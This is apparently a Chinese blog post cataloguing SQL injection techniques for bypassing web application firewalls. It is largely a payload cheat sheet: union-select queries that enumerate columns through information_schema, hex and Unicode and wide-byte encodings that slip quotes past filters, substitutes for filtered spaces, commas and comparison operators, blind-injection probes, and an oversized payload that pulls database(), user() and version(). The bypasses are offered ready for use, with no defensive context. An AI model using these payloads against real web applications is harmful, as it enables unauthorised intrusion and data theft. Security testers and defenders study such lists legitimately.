# 原创
：  SQL篇之SQL注入绕过姿势总结

# SQL篇之SQL注入绕过姿势总结

**目录**

[1.注释符绕过](#blogTitle0)

[2.大小写绕过](#blogTitle1)

[3.内联注释绕过](#blogTitle2)

[4.双写关键字绕过](#blogTitle3)

[5.特殊编码绕过](#blogTitle4)

[6.空格过滤绕过](#blogTitle5)

[7.过滤or and xor(异或) not 绕过](#blogTitle6)

[8.过滤等号=绕过](#blogTitle7)

[9.过滤大小于号绕过](#blogTitle8)

[10过滤引号绕过](#blogTitle9)

[11.过滤逗号绕过](#blogTitle10)

[12.过滤函数绕过](#blogTitle11)

[13.缓冲区溢出](#blogTitle12)

---


> 
如果文章对你有帮助，欢迎**关注、点赞、收藏**一键三连支持以下哦！
想要一起交流学习的小伙伴可以加zkaq222（备注CSDN，不备注通不过哦）进入学习，共同学习进步


### **1.注释符绕过**

常用的注释符有：

1）-- 注释内容

2）# 注释内容

3）/*注释内容*/

eg：union select 1,2#

union select 1,2 --+

构造闭合 ’ union select 1,2’

### **2.****大小写绕过**

常用于 waf的正则对大小写不敏感的情况。

eg：uniOn selEct 1,2

### **3.****内联注释绕过**

内联注释就是把一些特有的仅在MYSQL上的语句放在 /*!...*/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。别和注释/*... */搞混了。

eg：union /*!select*/ 1,2

### **4.****双写关键字绕过**

一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。

eg：union seselectlect 1,2

### **5.****特殊编码绕过**

1）十六进制绕过

eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B

2）ascii编码绕过

eg：Test =CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)

3）Unicode编码

常用的几个符号的一些Unicode编码：

单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7

空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0

左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8

右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9

### **6.****空格过滤绕过**

可代替空格的方式：

1）/**/

2）()

3）回车(url编码中的%0a)

4）`(tap键上面的按钮)

5）tap

6）两个空格

eg：union/**/select/**/1,2

select(passwd)from(users)  #注意括号中不能含有*

select`passwd`from`users`

### **7.****过滤or and xor****(****异或****)**** not 绕过**

and = &amp;&amp;

or = ||

xor = |

not = !

### **8.****过滤等号=绕过**

1）不加通配符的like执行的效果和=一致，所以可以用来绕过。

eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name like "users"

2）rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来，用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样

eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name rlike "users"

3）regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配

eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name regexp "users"

4）使用大小于号来绕过

eg：select * from users where id &gt; 1 and id &lt; 3

5）&lt;&gt; 等价于 !=，所以在前面再加一个!结果就是等号了

eg：select * from users where !(id &lt;&gt; 1)

### **9.****过滤大小于号绕过**

在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。

1）greatest(n1, n2, n3…):返回n中的最大值

eg：select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116

2）least(n1,n2,n3…):返回n中的最小值，与上同理。

3）strcmp(str1,str2):若所有的字符串均相同，则返回0，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1

eg：select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),117)

4）in关键字

eg：select * from users where id = 1 and substr(username,1,1) in ('t')

5）between a and b:范围在a-b之间，包括a、b。

eg：select * from users where id between 1 and 2

select * from users where id between 1 and 1

### **10****过滤引号绕过**

1）使用十六进制

eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B

2）宽字节，常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。%27表示 '(单引号)，单引号会被转义成\'

eg：%E6' union select 1,2 #

%df%27 union select  1,2,3  #

### **11.****过滤逗号绕过**

1）如果waf过滤了逗号，并且只能盲注，在取子串的几个函数中，有一个替代逗号的方法就是使用from pos for len，其中pos代表从pos个开始读取len长度的子串<br/> eg：常规写法 select substr("string",1,3)

若过滤了逗号，可以使用from pos for len来取代 select substr("string" from 1 for 3)

sql盲注中 select ascii(substr(database() from 1 for 1)) &gt; 110

2）也可使用join关键字来绕过

eg：select * from users union select * from (select 1)a join (select 2)b join(select 3)c

上式等价于 union select 1,2,3

3）使用like关键字，适用于substr()等提取子串的函数中的逗号

eg：select user() like "t%"

上式等价于 select ascii(substr(user(),1,1))=114

5）使用offset关键字，适用于limit中的逗号被过滤的情况，limit 2,1等价于limit 1 offset 2

eg：select * from users limit 1 offset 2

上式等价于 select * from users limit 2,1

### **12.****过滤函数绕过**

1）sleep() --&gt;benchmark()

MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式

eg：select 1,2 and benchmark(1000000000,1)

2）ascii()–&gt;hex()、bin()，替代之后再使用对应的进制转string即可

3）group_concat()–&gt;concat_ws()，第一个参数为分隔符 

eg：mysql&gt; select concat_ws(",","str1","str2")

4）substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()

5）user() --&gt; @@user、datadir–&gt;@@datadir

6）ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致

### **13.****缓冲区溢出**

缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过

eg：?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26

示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出
